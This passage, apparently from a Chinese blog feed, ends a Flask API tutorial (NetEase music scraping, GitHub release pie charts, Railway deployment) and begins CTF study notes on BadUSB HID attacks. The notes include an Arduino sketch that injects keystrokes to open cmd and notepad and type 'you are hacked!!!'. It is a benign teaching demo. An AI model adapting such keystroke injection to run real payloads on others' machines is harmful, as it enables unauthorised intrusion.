class="string">&#x27;&lt;/a&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> author == <span class="string">&#x27;$&#123;escape(x.beRepliedUser.nickname)&#125;&#x27;</span>:</span><br><span class="line">            author = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        author = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> song, author</span><br></pre></td></tr></table></figure><p>首先因为涉及到网络，所以就引入了一个<code>requests</code>模块（精简版的<code>utllib</code>），然后把我原来在JavaScript写的逻辑搬过来，就形成了<code>NeteaseDownload</code>这个函数，那就剩下重命名没搞定。因为手动解析网易云音乐的网页很麻烦，所以就用了一个叫做<code>beautifulsoup4</code>的模块来帮助我解析。在这里直接搜索<code>&lt;em&gt;</code>元素，限定class为<code>f-ff2</code>，这样就可以找到歌曲名；在用re寻找<code>&lt;a&gt;</code>标签下class为<code>&lt;s-fc7&gt;</code>的内容，这些元素和class都是通过分析网易云音乐网站的源代码获得的。当然当用户输入了非法的id的时候，在网易云上就无法获取到歌曲信息，这时候通过搜索作者中内容为<code>$&#123;escape(x.beRepliedUser.nickname)&#125;</code>的情况就可以判断，向用户返回非法id的信息</p><p>接着在主程序中注册网易云音乐的解析器，给网易云音乐的API设定路径即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> utils.NeteaseCloudMusic <span class="keyword">import</span> NeteaseDownload</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;query&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>) </span><span class="comment"># First path handler</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parser</span>(<span class="params">query</span>):</span><br><span class="line">    paths = [<span class="string">&#x27;song&#x27;</span>]  <span class="comment"># All requests paths</span></span><br><span class="line">    path = query.split(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    parameter = path[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> parameter <span class="keyword">not</span> <span class="keyword">in</span> paths:   <span class="comment"># When the path not exists, this will return 404</span></span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">if</span> parameter == <span class="string">&#x27;song&#x27;</span>:</span><br><span class="line">        <span class="built_in">id</span> = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">        ContentType = request.args.get(<span class="string">&#x27;type&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> NeteaseHandler(<span class="built_in">id</span>, ContentType)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Github-RELEASE下载次数饼状图"><a href="#Github-RELEASE下载次数饼状图" class="headerlink" title="Github RELEASE下载次数饼状图"></a>Github RELEASE下载次数饼状图</h4><p>这个用到了<code>matplotlib.pyplot</code>这个模块，上面说这种模块名字很长的就可以给它命个别名，所以在引入的时候就给它改了个名字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> matplotlib<span class="comment"># 本体，在后面颜色的设定用到了</span></span><br></pre></td></tr></table></figure><p>然后就是疯狂地写代码，Github的下载次数是有API可以获取的（不过有QPS就是了）</p><p>从Github获取次数后进行json解析，把RELEASE版本信息和次数提取出来，接着放到图片里就可以了，总之就是写成了下面这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> matplotlib</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"></span><br><span class="line">ReleaseBase = <span class="string">&#x27;https://api.github.com/repos/&#x27;</span></span><br><span class="line">domain = <span class="string">&#x27;dev.api.ninym.top&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ghParser</span>(<span class="params">operation, author, repo, ContentType</span>):</span><br><span class="line">    operations = [<span class="string">&#x27;release&#x27;</span>]</span><br><span class="line">    Error404 = &#123;</span><br><span class="line">        <span class="string">&#x27;code&#x27;</span>: <span class="number">404</span>,</span><br><span class="line">        <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;Invalid path gh/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(operation)</span><br><span class="line">    &#125;</span><br><span class="line">    Error501 = &#123;</span><br><span class="line">        <span class="string">&#x27;code&#x27;</span>: <span class="number">501</span>,</span><br><span class="line">        <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;It seems that this repo has no any release&#x27;</span>.<span class="built_in">format</span>(operation)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> operation <span class="keyword">not</span> <span class="keyword">in</span> operations: <span class="keyword">return</span> json.dump(Error404)</span><br><span class="line">    <span class="keyword">if</span> operation == <span class="string">&#x27;release&#x27;</span>:</span><br><span class="line">        release = Release(author,repo,ContentType)</span><br><span class="line">        <span class="keyword">if</span> release.isEmpty:</span><br><span class="line">            <span class="keyword">return</span> json.dumps(Error501)</span><br><span class="line">        <span class="keyword">return</span> release.Draw()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Release</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, author, repo, ContentType</span>):</span><br><span class="line">        self.author = author</span><br><span class="line">        self.repo = repo</span><br><span class="line">        self.info = json.loads(r.get(ReleaseBase+self.author+<span class="string">&#x27;/&#x27;</span>+self.repo+<span class="string">&#x27;/releases&#x27;</span>).text)</span><br><span class="line">        self.ContentType = ContentType</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.info) == <span class="number">0</span>: self.isEmpty = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>: self.isEmpty = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getInfo</span>(<span class="params">self</span>):  <span class="comment"># For debugging</span></span><br><span class="line">        <span class="keyword">return</span> self.info</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">makeDimensionList</span>(<span class="params">self</span>):</span><br><span class="line">        self.ReleaseLabel = []</span><br><span class="line">        self.ReleaseDownloads = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self.info:</span><br><span class="line">            Downloads = <span class="number">0</span></span><br><span class="line">            TagName = i[<span class="string">&#x27;tag_name&#x27;</span>]</span><br><span class="line">            assets = i[<span class="string">&#x27;assets&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(assets) == <span class="number">0</span>:</span><br><span class="line">                self.ReleaseLabel = <span class="literal">None</span></span><br><span class="line">                self.ReleaseDownloads = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> assets:</span><br><span class="line">                    Downloads += j[<span class="string">&#x27;download_count&#x27;</span>]</span><br><span class="line">                self.ReleaseLabel.append(TagName)</span><br><span class="line">                self.ReleaseDownloads.append(Downloads)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Draw</span>(<span class="params">self</span>): </span><br><span class="line">        self.makeDimensionList()</span><br><span class="line">        plt.figure(figsize=(<span class="number">10</span>,<span class="number">10</span>)) <span class="comment"># Make the circle to be a formal one</span></span><br><span class="line">        matplotlib.rcParams.update(&#123;<span class="string">&#x27;font.size&#x27;</span>: <span class="number">20</span>&#125;)   <span class="comment"># Change the font size of title</span></span><br><span class="line">        <span class="keyword">if</span> self.ReleaseDownloads == <span class="literal">None</span> <span class="keyword">and</span> self.ReleaseLabel == <span class="literal">None</span>:</span><br><span class="line">            values = [<span class="number">100</span>]</span><br><span class="line">            plt.title(<span class="string">&#x27;No Any Downloadable Asset from &#123;&#125;/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.author,self.repo))</span><br><span class="line">            r = np.linspace(<span class="number">106</span>,<span class="number">142</span>,<span class="number">1</span>,dtype=np.uint8)</span><br><span class="line">            g = np.linspace(<span class="number">103</span>,<span class="number">140</span>,<span class="number">1</span>,dtype=np.uint8)</span><br><span class="line">            b = np.linspace(<span class="number">232</span>,<span class="number">216</span>,<span class="number">1</span>,dtype=np.uint8)</span><br><span class="line">            colors = [<span class="string">&#x27;#&#x27;</span>+<span class="string">&#x27;&#123;:0&gt;2&#125;&#123;:0&gt;2&#125;&#123;:0&gt;2&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">hex</span>(r[i])),<span class="built_in">str</span>(<span class="built_in">hex</span>(g[i])),<span class="built_in">str</span>(<span class="built_in">hex</span>(b[i]))).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(r))]            </span><br><span class="line">            plt.pie(values,colors=colors)</span><br><span class="line">            plt.savefig(<span class="string">&#x27;./cache/&#123;&#125;-&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(self.author,self.repo))</span><br><span class="line">            <span class="keyword">if</span> self.ContentType == <span class="string">&#x27;pic&#x27;</span>: <span class="keyword">return</span> flask.send_from_directory(<span class="string">&#x27;./cache/&#x27;</span>, <span class="string">&#x27;&#123;&#125;-&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(self.author,self.repo), as_attachment=<span class="literal">False</span>, download_name=<span class="string">&#x27;&#123;&#125; - &#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(self.author, self.repo))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dt = &#123;</span><br><span class="line">                    <span class="string">&#x27;author&#x27;</span>: self.author,</span><br><span class="line">                    <span class="string">&#x27;repo&#x27;</span>: self.repo,</span><br><span class="line">                    <span class="string">&#x27;labels&#x27;</span>: self.ReleaseLabel,</span><br><span class="line">                    <span class="string">&#x27;downloads&#x27;</span>: self.ReleaseDownloads,</span><br><span class="line">                    <span class="string">&#x27;pic&#x27;</span>: <span class="string">&#x27;https://&#123;&#125;/cache/&#123;&#125;-&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(domain,self.author,self.repo),</span><br><span class="line">                    <span class="string">&#x27;remark&#x27;</span>: <span class="string">&#x27;The access to the pic will be removed when the service is redeployed or by the operation of administrator&#x27;</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> json.dumps(dt)</span><br><span class="line">        explode = [<span class="number">0.01</span>] * <span class="built_in">len</span>(self.ReleaseLabel)</span><br><span class="line">        r = np.linspace(<span class="number">106</span>,<span class="number">142</span>,<span class="built_in">len</span>(self.ReleaseDownloads),dtype=np.uint8)</span><br><span class="line">        g = np.linspace(<span class="number">103</span>,<span class="number">140</span>,<span class="built_in">len</span>(self.ReleaseDownloads),dtype=np.uint8)</span><br><span class="line">        b = np.linspace(<span class="number">232</span>,<span class="number">216</span>,<span class="built_in">len</span>(self.ReleaseDownloads),dtype=np.uint8)</span><br><span class="line">        colors = [<span class="string">&#x27;#&#x27;</span>+<span class="string">&#x27;&#123;:0&gt;2&#125;&#123;:0&gt;2&#125;&#123;:0&gt;2&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">hex</span>(r[i])),<span class="built_in">str</span>(<span class="built_in">hex</span>(g[i])),<span class="built_in">str</span>(<span class="built_in">hex</span>(b[i]))).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(r))]</span><br><span class="line">        plt.pie(self.ReleaseDownloads,explode=explode,labels=self.ReleaseLabel,autopct=<span class="string">&#x27;%1.1f%%&#x27;</span>,colors=colors)</span><br><span class="line">        plt.title(<span class="string">&#x27;Downloads of &#123;&#125;/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.author,self.repo))</span><br><span class="line">        plt.savefig(<span class="string">&#x27;./cache/&#123;&#125;-&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(self.author,self.repo))</span><br><span class="line">        <span class="keyword">if</span> self.ContentType == <span class="string">&#x27;pic&#x27;</span>: <span class="keyword">return</span> flask.send_from_directory(<span class="string">&#x27;./cache/&#x27;</span>, <span class="string">&#x27;&#123;&#125;-&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(self.author,self.repo), as_attachment=<span class="literal">False</span>, download_name=<span class="string">&#x27;&#123;&#125; - &#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(self.author, self.repo))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dt = &#123;</span><br><span class="line">                <span class="string">&#x27;author&#x27;</span>: self.author,</span><br><span class="line">                <span class="string">&#x27;repo&#x27;</span>: self.repo,</span><br><span class="line">                <span class="string">&#x27;labels&#x27;</span>: self.ReleaseLabel,</span><br><span class="line">                <span class="string">&#x27;downloads&#x27;</span>: self.ReleaseDownloads,</span><br><span class="line">                <span class="string">&#x27;pic&#x27;</span>: <span class="string">&#x27;https://&#123;&#125;/cache/&#123;&#125;-&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(domain,self.author,self.repo),</span><br><span class="line">                <span class="string">&#x27;remark&#x27;</span>: <span class="string">&#x27;The access to the pic will be removed when the service is redeployed or by the operation of administrator&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> json.dumps(dt)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后还是一样在主程序中注册路径即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> utils.Github <span class="keyword">import</span> ghParser</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/gh/&lt;operation&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)   </span><span class="comment"># Github Handler</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ghHandler</span>(<span class="params">operation</span>):</span><br><span class="line">    Analytics(request)</span><br><span class="line">    author = request.args.get(<span class="string">&#x27;author&#x27;</span>)</span><br><span class="line">    repo = request.args.get(<span class="string">&#x27;repo&#x27;</span>)</span><br><span class="line">    ContentType = request.args.get(<span class="string">&#x27;type&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ContentType != <span class="string">&#x27;pic&#x27;</span> <span class="keyword">and</span> ContentType != <span class="string">&#x27;json&#x27;</span>:</span><br><span class="line">        ContentType = <span class="string">&#x27;pic&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> ghParser(operation, author, repo, ContentType)</span><br></pre></td></tr></table></figure><h3 id="部署服务"><a href="#部署服务" class="headerlink" title="部署服务"></a>部署服务</h3><p>部署服务我选择的是<a href="https://railway.app/?referralCode=U8coe_">Railway</a>这个平台，相比于heroku来说比较快，而且不用绑卡就能绑定域名，很方便</p><p>在这上面新建环境，选择Deploy from Github Repo，然后选中自己的仓库就行了</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/API-FLASK/New_project_%E5%92%8C%E5%8F%A6%E5%A4%96_7_%E4%B8%AA%E9%A1%B5%E9%9D%A2_-_%E4%B8%AA%E4%BA%BA_-_Microsoft%E2%80%8B_Edge%20-%2020220419-111540.png?download=true"></p><p>然后在项目的设置中进行自定义域名的绑定和启动命令的修改即可</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/API-FLASK/api-flask_%E5%92%8C%E5%8F%A6%E5%A4%96_8_%E4%B8%AA%E9%A1%B5%E9%9D%A2_-_%E4%B8%AA%E4%BA%BA_-_Microsoft%E2%80%8B_Edge%20-%2020220419-111739.png?download=true"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/API-FLASK/api-flask_%E5%92%8C%E5%8F%A6%E5%A4%96_8_%E4%B8%AA%E9%A1%B5%E9%9D%A2_-_%E4%B8%AA%E4%BA%BA_-_Microsoft%E2%80%8B_Edge%20-%2020220419-111725.png?download=true"></p><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>总的来说，用Flask还是比较方便的，何况我还是比较会用Python，能够做出很多奇奇怪怪的东西，但是就是缺少点子</p><p>如果你有什么想法也可以在评论区留言，我说不定会做出来呢？</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF学习笔记（大学篇）02 —— BadUSB &amp; CobaltStrike</title>
      <link href="/posts/CTF-in-College-2/"/>
      <url>/posts/CTF-in-College-2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="HID设备"><a href="#HID设备" class="headerlink" title="HID设备"></a>HID设备</h3><p>人类接口设备，就是直接与人类进行交互的设备（鼠标、键盘之类的）</p><h3 id="HID攻击"><a href="#HID攻击" class="headerlink" title="HID攻击"></a>HID攻击</h3><p>插入一定的设备，设备有一定的标识符（例如Keyboard、Mouse），插入后就可以运行烧录在BadUSB上的指令来输入恶意代码，把木马植入计算机之中。（伪造用户击键行为等）</p><h3 id="USB-HID攻击-VS-摆渡攻击"><a href="#USB-HID攻击-VS-摆渡攻击" class="headerlink" title="USB HID攻击 VS 摆渡攻击"></a>USB HID攻击 VS 摆渡攻击</h3><p>前者运用的是伪造的HID设备执行恶意代码，摆渡攻击是在U盘等设备放置木马程序，隐藏在存储介质之中。</p><h3 id="USB-HID攻击特点"><a href="#USB-HID攻击特点" class="headerlink" title="USB HID攻击特点"></a>USB HID攻击特点</h3><ul><li>隐蔽性强</li><li>攻击范围广</li><li>权限高</li></ul><p>攻击范围是只要能够支持USB HID接口协议的设备均可用。</p><h3 id="相关编程语句"><a href="#相关编程语句" class="headerlink" title="相关编程语句"></a>相关编程语句</h3><h4 id="默认内容"><a href="#默认内容" class="headerlink" title="默认内容"></a>默认内容</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>void setup()</code>函数内的代码只运行一次</li><li><code>void loop()</code>函数内的代码会一直循环运行</li></ul><h4 id="运行cmd并打开记事本，输入相关内容"><a href="#运行cmd并打开记事本，输入相关内容" class="headerlink" title="运行cmd并打开记事本，输入相关内容"></a>运行cmd并打开记事本，输入相关内容</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Keyboard.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// put your setup code here, to run once:</span></span><br><span class="line">Keyboard.<span class="built_in">begin</span>();</span><br><span class="line"><span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">Keyboard.<span class="built_in">press</span>(KEY_LEFT_GUI);<span class="comment">//win键</span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">Keyboard.<span class="built_in">press</span>(<span class="string">&#x27;r&#x27;</span>);<span class="comment">//r键</span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">Keyboard.<span class="built_in">release</span>(KEY_LEFT_GUI);<span class="comment">//win键释放</span></span><br><span class="line">Keyboard.<span class="built_in">release</span>(<span class="string">&#x27;r&#x27;</span>);<span class="comment">//r键释放</span></span><br><span class="line"></span><br><span class="line">Keyboard.<span class="built_in">press</span>(KEY_CAPS_LOCK);<span class="comment">//若目标机开启大小写，关掉即可</span></span><br><span class="line">Keyboard.<span class="built_in">release</span>(KEY_CAPS_LOCK);<span class="comment">//若目标机没有开启，也不影响</span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">Keyboard.<span class="built_in">println</span>(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">Keyboard.<span class="built_in">press</span>(KEY_RETURN);</span><br><span class="line">Keyboard.<span class="built_in">release</span>(KEY_RETURN);<span class="comment">//目标机开启中文或开启大小写键</span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//弹出记事本</span></span><br><span class="line">Keyboard.<span class="built_in">println</span>(<span class="string">&quot;notepad.exe&quot;</span>);</span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>);<span class="comment">//可防止丢帧</span></span><br><span class="line">Keyboard.<span class="built_in">println</span>(<span class="string">&quot;you are hacked!!!&quot;</span>);</span><br><span class="line">Keyboard.<span class="built_in">println</span>(<span class="string">&quot;you are hacked!!!&quot;</span>);</span><br><span class="line">Keyboard.<span class="built_in">println</span>(<span class="string">&quot;you are hacked!!!&quot;</span>);</span><br><span class="line">Keyboard.<span class="built_in">press</span>(KEY_CAPS_LOCK);<span class="comment">//若目标机开启大小写，关掉即可</span></span><br><span class="line">Keyboard.<span class="built_in">release</span>(KEY_CAPS_LOCK);</span><br><span class="line">Keyboard.<span class="built_in">end</span>();<span class="comment">//结束键盘通讯</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// put your main code here, to run repeatedly:</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>Keyboard.press</code>就表示按下按键，用<code>Keyboard.release</code>松开</li><li><code>KEY_LEFT_GUI</code>表示左边的Win按键</li><li><code>Keyboard.begin()</code>开启键盘通讯，<code>Keyboard.end()</code>来表示结束</li><li>因为插入设备的时候目标主机可能处于中文输入法，所以用<code>Keyboard.press(KEY_CAPS_LOCK)</code>打开大小写锁定，然后来输入命令，这样输入的就是英文字符而不受到中文输入法的限制了，输入完了以后记得用<code>Keyboard.release(KEY_CAPS_LOCK)</code>松开</li><li><code>Keyboard.begin()</code>下面的<code>delay(1000)</code>：一般来说，设备插入后计算机需要启动驱动，在这里加入延迟就是为了给计算机启动驱动的时间（甚至是安装驱动，diss一下win7以下的那堆），当然一般是3秒5秒，1秒还是太短了</li><li>按键的定义如下（键盘按键+编码）</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///Alt和Ctrl和Shift</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_LEFT_CTRL   0x80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_LEFT_SHIFT    0x81</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_LEFT_ALT    0x82</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_LEFT_GUI    0x83</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_RIGHT_CTRL    0x84</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_RIGHT_SHIFT   0x85</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_RIGHT_ALT   0x86</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_RIGHT_GUI   0x87</span></span><br><span class="line"><span class="comment">///方向键系列</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_UP_ARROW    0xDA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_DOWN_ARROW    0xD9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_LEFT_ARROW    0xD8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_RIGHT_ARROW   0xD7</span></span><br><span class="line"><span class="comment">//特殊键位，其中RETURN就是回车</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_BACKSPACE   0xB2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_TAB       0xB3</span></span><br><span class="line"><span class="meta">#<span 